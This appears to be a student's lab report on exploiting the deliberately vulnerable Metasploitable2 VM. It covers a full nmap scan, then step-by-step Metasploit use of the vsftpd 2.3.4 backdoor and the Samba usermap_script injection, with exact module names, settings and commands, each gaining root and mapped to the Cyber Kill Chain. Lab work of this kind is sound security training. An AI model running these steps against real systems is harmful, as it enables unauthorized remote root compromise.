# Metasploitable2 Exploitation Report

**Name:** Nayram Banyie Mawah
**Index Number:** 4191624
**Date:** 2026-09-20
**Target IP:** 192.168.1.3
**Attacker OS / Tools:** Kali Linux, Metasploit Framework 6.4.135-dev, nmap 7.99

---

## Reconnaissance Summary

Command used: `nmap -sV -sC 192.168.1.3`

Full scan saved in `evidence/recon.txt`. Summary of key findings: 23 open TCP ports
were discovered, spanning FTP (vsftpd 2.3.4), SSH (OpenSSH 4.7p1), Telnet, SMTP
(Postfix), DNS (BIND 9.4.2), HTTP (Apache 2.2.8), RPC services, Samba (SMB 3.0.20),
rsh/rlogin, Java RMI, a bindshell on port 1524, NFS, MySQL 5.0.51a, PostgreSQL 8.3,
VNC, X11, IRC (UnrealIRCd), and two web/app servers on ports 8009/8180 (Tomcat).
Several of these are known-vulnerable legacy versions, forming the basis for the
exploits documented below.

```
# Nmap 7.99 scan initiated Sun Sep 20 07:40:27 2026 as: /usr/lib/nmap/nmap --privileged -sV -sC -oN recon.txt 192.168.1.3
Nmap scan report for 192.168.1.3
Host is up (0.00048s latency).
Not shown: 977 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.1.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
|_ssl-date: 2026-09-20T11:40:49+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2010-03-17T14:07:45
|_Not valid after:  2010-04-16T14:07:45
|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|_    SSL2_DES_64_CBC_WITH_MD5
53/tcp   open  domain      ISC BIND 9.4.2
| dns-nsid: 
|_  bind.version: 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
|_http-title: Metasploitable2 - Linux
111/tcp  open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/udp   nfs
|   100005  1,2,3      38763/tcp   mountd
|   100005  1,2,3      49036/udp   mountd
|   100021  1,3,4      35504/tcp   nlockmgr
|   100021  1,3,4      46262/udp   nlockmgr
|   100024  1          52949/udp   status
|_  100024  1          58578/tcp   status
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login       OpenBSD or Solaris rlogind
514/tcp  open  tcpwrapped
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
| mysql-info: 
|   Protocol: 10
|   Version: 5.0.51a-3ubuntu5
|   Thread ID: 21
|   Capabilities flags: 43564
|   Some Capabilities: LongColumnFlag, Support41Auth, SupportsTransactions, SwitchToSSLAfterHandshake, ConnectWithDatabase, Speaks41ProtocolNew, SupportsCompression
|   Status: Autocommit
|_  Salt: ].lT@&9/{D}j{KEXk2S,
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
|_ssl-date: 2026-09-20T11:40:49+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2010-03-17T14:07:45
|_Not valid after:  2010-04-16T14:07:45
5900/tcp open  vnc         VNC (protocol 3.3)
| vnc-info: 
|   Protocol version: 3.3
|   Security types: 
|_    VNC Authentication (2)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/5.5
MAC Address: 08:00:27:8B:C5:FE (Oracle VirtualBox virtual NIC)
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h00m01s, deviation: 2h00m00s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: metasploitable
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: metasploitable.localdomain
|_  System time: 2026-09-20T07:40:41-04:00
|_smb2-time: Protocol negotiation failed (SMB2)


```

---

## Exploit 1: vsftpd 2.3.4 Backdoor Command Execution

- **Service / Port:** FTP / 21
- **Vulnerability:** Malicious backdoor planted in vsftpd 2.3.4 source (CVE-2011-2523) — a crafted
  username triggers a root shell on port 6200 instead of processing the login.
- **Tool Used:** Metasploit — exploit/unix/ftp/vsftpd_234_backdoor
- **Why This Tool:** Nmap's service scan fingerprinted the exact vulnerable version (vsftpd 2.3.4)
  running on port 21. Metasploit has a purpose-built module specifically for this backdoor, so rather
  than manually crafting the malicious username string and handling the raw socket interaction myself,
  the module automates detection (AutoCheck confirms the banner is vulnerable), triggers the backdoor,
  and wires up a Meterpreter session automatically.
- **Steps:**
  1. `nmap -sV -sC 192.168.1.3` — identified vsftpd 2.3.4 on port 21 (Reconnaissance)
  2. `msfconsole` then `search vsftpd` — found `exploit/unix/ftp/vsftpd_234_backdoor` (Weaponization)
  3. `use 1`, `set RHOSTS 192.168.1.3`, `set LHOST 192.168.1.4`
  4. `run` — module confirmed the vulnerable banner, triggered the backdoor (Delivery/Exploitation),
     and opened a Meterpreter session (Installation/C2)
  5. `getuid` confirmed root access; `sysinfo` confirmed target OS details (Actions on Objectives)
- **Evidence:** evidence/exploit1.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, C2, Actions on Objectives
  - **Reconnaissance:** the nmap scan identified the exact vulnerable service version.
  - **Weaponization:** selecting and configuring the matching Metasploit module/payload for that version.
  - **Delivery:** the module connecting to port 21 and sending the crafted backdoor trigger.
  - **Exploitation:** the backdoor code actually firing on the target, spawning a shell.
  - **Installation:** the Meterpreter payload establishing itself as a running foothold on the target.
  - **C2:** the live Meterpreter session itself, giving ongoing remote control of the target.
  - **Actions on Objectives:** running `getuid`/`sysinfo` to confirm and use the access obtained.
- **Outcome / Impact:** Full unauthenticated remote code execution as root — the highest possible
  privilege level, with zero credentials required.

---
## Exploit 2: Samba "username map script" Command Execution

- **Service / Port:** SMB / 139, 445
- **Vulnerability:** Samba versions before 3.0.20 process the `username map script` config option
  unsafely, allowing shell metacharacters in a login attempt to be passed through to a shell and
  executed (CVE-2007-2447).
- **Tool Used:** Metasploit — exploit/multi/samba/usermap_script
- **Why This Tool:** Nmap fingerprinted Samba smbd 3.0.20-Debian on ports 139/445, a version known to
  be vulnerable to this specific command injection flaw. The module automates crafting the malicious
  login string needed to trigger the injection, rather than requiring manual construction of the
  raw SMB authentication packet.
- **Steps:**
  1. `nmap -sV -sC 192.168.1.3` — identified Samba smbd 3.0.20-Debian on ports 139/445 (Reconnaissance)
  2. `msfconsole` then `search usermap` — found `exploit/multi/samba/usermap_script` (Weaponization)
  3. `use 0`, `set RHOSTS 192.168.1.3` (LHOST was already set from the previous exploit)
  4. `run` — module sent the crafted login triggering command injection (Delivery/Exploitation),
     opening a command shell session (Installation/C2)
  5. `whoami`, `id`, `uname -a` confirmed root access and target details (Actions on Objectives)
- **Evidence:** evidence/exploit2.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, C2, Actions on Objectives
  - **Reconnaissance:** nmap identified the specific vulnerable Samba version.
  - **Weaponization:** selecting the matching Metasploit module for this exact CVE.
  - **Delivery:** the module sending the crafted authentication request containing the injection payload.
  - **Exploitation:** the unsafe config option executing the injected shell command.
  - **Installation:** the reverse shell payload establishing a running connection back to the attacker.
  - **C2:** the open command shell session providing ongoing control of the target.
  - **Actions on Objectives:** running whoami/id/uname -a to confirm and use the access obtained.
- **Outcome / Impact:** Full unauthenticated remote command execution as root via a command injection
  vulnerability in Samba's configuration handling.

---
